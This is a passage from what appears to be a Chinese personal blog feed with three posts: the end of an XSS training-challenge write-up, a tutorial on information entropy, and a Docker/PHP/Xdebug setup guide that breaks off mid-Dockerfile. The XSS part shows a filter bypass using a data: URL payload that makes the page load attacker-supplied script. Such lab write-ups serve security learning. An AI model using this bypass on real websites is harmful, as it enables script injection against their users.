punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// This will totally prevent us from loading evil URLs!</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Load this awesome gadget</span>      scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>       <span class="token comment">// Show log messages</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Loaded gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Couldn't load gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// Take the value after # and use it as the gadget filename.</span>    <span class="token keyword">function</span> <span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"/static/gadget.js"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Extra code so that we can communicate with the parent page</span>    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level6.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cube<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level6_cube.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Loading gadget...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>gadget.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* This is a completely awesome invisible gadget */</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This will totally prevent us from loading evil URLs!</span><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Load this awesome gadget</span>scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span></code></pre><p>直接加载外部脚本，如图所示</p><img src="/article/xss/image-20210424165312513.png" class="" title="level6-1" loading="lazy"><p>既然没有任何过滤，那就直接用data数据流加载即可</p><p>RFC2397对data数据流有过定义 <a href="https://tools.ietf.org/html/rfc2397">https://tools.ietf.org/html/rfc2397</a></p><p><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p><p>payload:</p><pre class="language-none"><code class="language-none">data:text&#x2F;plain,alert(1);</code></pre><img src="/article/xss/image-20210424165650678.png" class="" title="level6-2" loading="lazy"><img src="/article/xss/image-20210424165707701.png" class="" title="level6-3" loading="lazy"><hr><p>学习了基本的Cross-site scripting (XSS)</p><p>跨站点脚本（XSS）是一个安全漏洞，可能会影响网站。 这个漏洞可能使攻击者可以将自己的恶意JavaScript代码添加到显示给用户的HTML页面上。 一旦被害者的浏览器访问，此代码便可以执行，改变网站的行为或外观，窃取私人数据或代表用户执行操作等等</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熵和信息的学习</title>
      <link href="article/entropy/"/>
      <url>article/entropy/</url>
      
        <content type="html"><![CDATA[<p>摸鱼的学习总结，搞作品赛必须的理论学习…</p><a id="more"></a><blockquote><p><strong>信息是从多个可能状态中确定实际状态的代价</strong></p></blockquote><p>有些平台的回答挺好的，建议看看参考链接</p><img src="/article/entropy/640" class="" title="Entropy" loading="lazy"><p><strong>例子：How much is the shirt?</strong></p><p><strong>衬衫的价格是9磅15便士，所以你选择B项，答案却是C项。</strong></p><h2 id="信息熵"><a href="#信息熵" class="headerlink" title="信息熵"></a>信息熵</h2><p>当一件事情(宏观态)有很多种可能的情况时，这件事情(宏观态)对某人(观察者)而言具体是哪种情况(微观态)的不确定性叫做熵.</p><p>即这(知情情况的不确定性)就是熵</p><img src="/article/entropy/image-20210412143856985.png" class="" title="熵" loading="lazy"><p>而能<strong>消除这种不确定性的事物</strong>就是信息</p><img src="/article/entropy/image-20210412144408346.png" class="" title="信息" loading="lazy"><h2 id="信息量"><a href="#信息量" class="headerlink" title="信息量"></a>信息量</h2><p>熵和信息的增减数量相等，获取信息的同时也会消除不确定性(熵)</p><blockquote><p><strong>消除</strong>熵 == <strong>获取</strong>信息</p></blockquote><p>例如在举例中，ABCD四个选项对于不知道最终答案的人来说都是等概率(25%)的，熵在此时(等概率)最大。</p><p>而告诉你答案是C的时候，这时熵最小。</p><p>能够消除熵的信息有三种类型，本质都是能够<strong>正确</strong>的调整每个可能情况的概率。</p><p>如果告诉你<code>&quot;答案是ABCD中的一个&quot;</code>则获取了0bit的信息，这种定义下，没有假信息的说法。只有能消除某人对某事不确定性的事物才叫做信息，即<code>&quot;答案是ABCD中的一个&quot;</code>不是信息</p><img src="/article/entropy/image-20210412152143538.png" class="" title="ABCD" loading="lazy"><p>而告诉你<code>&quot;A是正确答案&quot;</code>也不是信息(正确答案为C)，因为它不是正确的。</p><img src="/article/entropy/image-20210412152302898.png" class="" title="A" loading="lazy"><h3 id="类型一：调整概率"><a href="#类型一：调整概率" class="headerlink" title="类型一：调整概率"></a>类型一：调整概率</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中张三得知<code>&quot;有一半可能是C选项&quot;</code>，这个信息将C选项的概率提高到了50%(提供了0.21bits)</p><img src="/article/entropy/image-20210412153329273.png" class="" title="halfC" loading="lazy"><h3 id="类型二：排除干扰"><a href="#类型二：排除干扰" class="headerlink" title="类型二：排除干扰"></a>类型二：排除干扰</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中李四得知<code>&quot;B选项是错的&quot;</code>，这个信息直接将B选项概率降低到0%(0.415bits)</p><img src="/article/entropy/image-20210412153709078.png" class="" title="exclueB" loading="lazy"><h3 id="类型三：确定情况"><a href="#类型三：确定情况" class="headerlink" title="类型三：确定情况"></a>类型三：确定情况</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，王五英语非常好，从这个消息中王五直接得知<code>&quot;C选项是正确的&quot;</code>，这个信息直接将C选项概率提高到100%(2bits)，直接确定了实际情况。</p><img src="/article/entropy/image-20210412180814429.png" class="" title="C" loading="lazy"><h2 id="信息的接收"><a href="#信息的接收" class="headerlink" title="信息的接收"></a>信息的接收</h2><h3 id="媒介无关"><a href="#媒介无关" class="headerlink" title="媒介无关"></a>媒介无关</h3><p><strong>同一个观察者对同一件事接受到的信息与传递信息的信号模式无关</strong></p><p>王五写纸条给赵六<code>&quot;答案是C&quot;</code>传递的信息是2bits，直接告诉赵六传递的信息也是2bits，打三个响指(与赵六约定好，赵六能够理解)，传递的信息也是2bits</p><h3 id="相对个体"><a href="#相对个体" class="headerlink" title="相对个体"></a>相对个体</h3><p><strong>接收到的信息是相对于观察者已经对该事情的实际了解程度而言的</strong></p><p>王五会这道题，王五对这道题的熵就为0bit，不管王五搞不告诉赵六正确答案是C，因为观察者王五已经拥有这件事的所有信息，即王五确定(知道)这道题的答案是C，不确定性从最初就不存在。</p><p>赵六不会这道题，所以赵六对这道题的熵为2bits，因为观察者赵六没有对于这件事的任何信息。</p><p>对于李四而言，王五告诉张三<code>&quot;答案是C&quot;</code>，提供给李四1.58bits信息，因为观察者李四知道B是错的，观察者拥有关于这件事情的部分信息。</p><p>赵六认为C是错的，再告诉赵六答案是C，熵不会减少，因为没有实际帮助赵六消除事情的不确定性，因为熵不会随着主观臆想而减少，信息也不随主观意识而改变。</p><h3 id="相对事件"><a href="#相对事件" class="headerlink" title="相对事件"></a>相对事件</h3><p><code>&quot;太阳东升西落&quot;</code>，这句话对知道的人提供0bit信息，对知道或东或西升起的人提供了1bit信息，对认为东南西北都可能升起的人提供了2bits信息</p><img src="/article/entropy/image-20210412204545002.png" class="" title="东南西北" loading="lazy"><h2 id="信息量的计算"><a href="#信息量的计算" class="headerlink" title="信息量的计算"></a>信息量的计算</h2><p>信息也是物理量，类似于<code>千克</code>，选种千克为单位物理量，则测量其他物体的质量就是以多少个单位质量，即多少千克来计算。</p><p>信息也是参照单位事件的不确定性，看看待测事件的不确定性相当于”多少个”参照事件的不确定性，其中”多少个”，便是信息量。</p><p>如果选择参照事件像是抛硬币这样50%两种等概率情况的事件时，测量的信息量的单位就称为比特(bit)。</p><p>测量质量是，可以用待测物体质量m除以参照物体质量B，因为待测物体质量m=参照物体质量B 乘 参照物体个数n，所以知道总质量m 求 个数 n 时，利用除法计算即可。</p><p>可是测量信息时却不能用除法，因为抛三枚硬币产生的等可能结果并非 $3*2=6种$，而是 $2^3=8种$</p><p><code>[正正正,正正反,正反正,正反反,反正正,反正反,反反正,反反反]</code></p><p>不是线性关系，而是指数关系，所以当知道可能情况个数m，想求这些情况相当于多少个n参照事件产生的时，就用对数运算即可。</p><p>$$ m = 2^n $$</p><p>$$ n = log_2m $$</p><p>所以对答案ABCD里哪一选项的不确定性即为<br>$$ log_24 = 2 bits $$<br>这种情况因为每个选项都是25%的等概率才可以，与抛硬币一样，出现正反的概率都是相等的50%</p><img src="/article/entropy/image-20210413213110288.png" class="" width="24" loading="lazy"><p>可张三知道有一半可能是C选项时，各个情况的概率就不一样了。这时要分别测量待测事件每种可能的信息量后乘它们各自发生的概率再相加即可。</p><img src="/article/entropy/image-20210413213513800.png" class="" title="log2" loading="lazy"><p>不过我们不知道概率为1/6的情况的不确定性相当于抛多少个硬币所产生的不确定性，m未知就没法用这个公式</p><p>$$ log_2m_A $$</p><p>但1%会发生的情况相当于从100个等概率情况中确定实际情况，而概率的倒数=等概率情况的个数</p><p>$$ p = 1/100 $$<br>$$ 100 = 1/p $$</p><p>用概率的倒数1/p替换等概率情况个数m后就可以计算每种情况的信息量了</p><p>$$ m = 1/p $$</p><img src="/article/entropy/image-20210413214141284.png" class="" title="p1" loading="lazy"><p>再将每个情况的信息量乘对应发生的概率再相加，就能算出总信息量了</p><p>$$ P_A: 1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_b:1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_c:1/2 log_2(2/1) = 0.5 bits $$</p><p>$$ P_d:1/6 log_2(6/1) = 0.43 bits $$</p><p>张三得知<code>&quot;有一半可能是C选项&quot;</code>后的不确定性(熵)为 $1.79 bits$</p><p>$$ P_a+P_b+P_c+P_d = 1.79 bits $$</p><p>告诉张三<code>&quot;有一半可能是C选项&quot;</code>后提供的信息为 $2-1.79=0.21 bits$</p><h3 id="均匀分布"><a href="#均匀分布" class="headerlink" title="均匀分布"></a>均匀分布</h3><p>$$ log_2m $$</p><h3 id="一般分布"><a href="#一般分布" class="headerlink" title="一般分布"></a>一般分布</h3><p>$$ \sum p_i log_2 p_i^{-1} $$</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zhihu.com/question/22178202">知乎:信息熵是什么？</a></p><p><a href="https://mp.weixin.qq.com/s/toPBIMFPKG0FNzkKu2owfw">微信公众号:超智能体 信息论</a></p><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?filename=WJFZ202010024&dbcode=CJFQ&dbname=CJFD2020&v=f5iFxWNeOELznrq%25mmd2BGTndyblA9BGrQdi6BASTgoipwWx5vvgdZDVsk9Y0pGb3T8Ra">马猛飞,石乐义,魏东平,徐兴华.基于信息熵的分布式Web服务移动目标防御方案[J].计算机技术与发展,2020,30(10):131-136.</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker-php+mysql配置debug环境</title>
      <link href="article/phpstormdebug/"/>
      <url>article/phpstormdebug/</url>
      
        <content type="html"><![CDATA[<p>记录下之前搭建过程</p><a id="more"></a><h2 id="前置要求："><a href="#前置要求：" class="headerlink" title="前置要求："></a>前置要求：</h2><ol><li>装好phpstorm</li><li>装好docker</li><li>下载docker-compose(可选)</li></ol><p>最后附一键docker-compose搭建方法，可附带mysql，感谢王神指导。</p><h2 id="手动搭建"><a href="#手动搭建" class="headerlink" title="手动搭建"></a>手动搭建</h2><h3 id="docker进行PHP多版本部署"><a href="#docker进行PHP多版本部署" class="headerlink" title="docker进行PHP多版本部署"></a>docker进行PHP多版本部署</h3><p><code>docker run -d -p 10001:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:5.6-apache</code><br><code>docker run -d -p 10002:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.4-apache</code><br><code>docker run -d -p 10003:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.2-apache</code><br><code>docker run -d -p 10004:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.3-apache</code><br><code>docker run -d -p 10005:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.0-apache</code></p><p>随意，要啥版本起啥容器，可以去<a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a> 看</p><p>参数解释：</p><pre class="language-none"><code class="language-none">-d ： 后台运行-v ： 目录映射，因为我们要把本地目录映射到容器目录本地目录:容器目录</code></pre><h3 id="安装xdebug模块"><a href="#安装xdebug模块" class="headerlink" title="安装xdebug模块"></a>安装xdebug模块</h3><p>安装vim并换源</p><pre class="language-sh" data-language="sh"><code class="language-sh">echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \&amp;&amp; apt update &amp;&amp; apt install -y vim</code></pre><p>安装xdebug模块</p><p><code>docker exec -it &lt;id&gt; bash</code>进入容器后</p><pre class="language-sh" data-language="sh"><code class="language-sh">docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug \    &amp;&amp; docker-php-ext-enable xdebug</code></pre><p><strong>注意</strong>：php5.6需要指定版本安装xdebug</p><pre class="language-sh" data-language="sh"><code class="language-sh">RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0</code></pre><p>运行<code>php -m</code> 发现已经安装好xdebug模块</p><h3 id="修改php-ini"><a href="#修改php-ini" class="headerlink" title="修改php.ini"></a>修改php.ini</h3><pre class="language-sh" data-language="sh"><code class="language-sh">cp &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini-production &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inivim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</code></pre><p>添加</p><pre class="language-none"><code class="language-none">[XDebug]xdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;host.docker.internalxdebug.remote_port&#x3D;9000xdebug.auto_trace&#x3D;Onxdebug.collect_vars&#x3D;Onxdebug.collect_return&#x3D;Onxdebug.collect_params&#x3D;Onxdebug.idekey&#x3D;phpstormxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;</code></pre><p>写进去之后重启apache服务 <code>apache2ctl restart</code></p><p>查看phpinfo，访问<a href="http://127.0.0.1:[port]">http://127.0.0.1:[port]</a></p><img src="/article/phpstormdebug/image-20210331131421851.png" class="" title="xdebug" loading="lazy"><hr><h2 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h2><p>php多版本+mysql服务</p><p>目录结构</p><pre class="language-none"><code class="language-none">|docker-compose.yml└--5.6 └-Dockerfile└--7.4 └-Dockerfile</code></pre><p>Docker-compose.yml，如果需要起不同或更多的版本，照着修改yml和Dockerfile即可</p><pre class="language-yml" data-language="yml"><code class="language-yml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">php5.6</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./5.6/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:5.6-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10001<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always <span class="token comment"># 自动重启，一般用于开机自启</span>    <span class="token key atrule">mysql</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql/mysql<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span class="token number">5.6</span>        <span class="token key atrule">environment</span><span class="token punctuation">:</span>             <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token string">"&lt;password>"</span> <span class="token comment"># 自设mysql的password</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 3306<span class="token punctuation">:</span><span class="token number">3306</span> <span class="token comment"># 由于映射端口，密码需设强密码，否则请关闭端口映射</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">php7.4</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./7.4/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:7.4-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10002<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always</code></pre><p>5.6的Dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:5.6-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0 \ # 指定xdebug版本    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>7.4的dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:7.4-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; 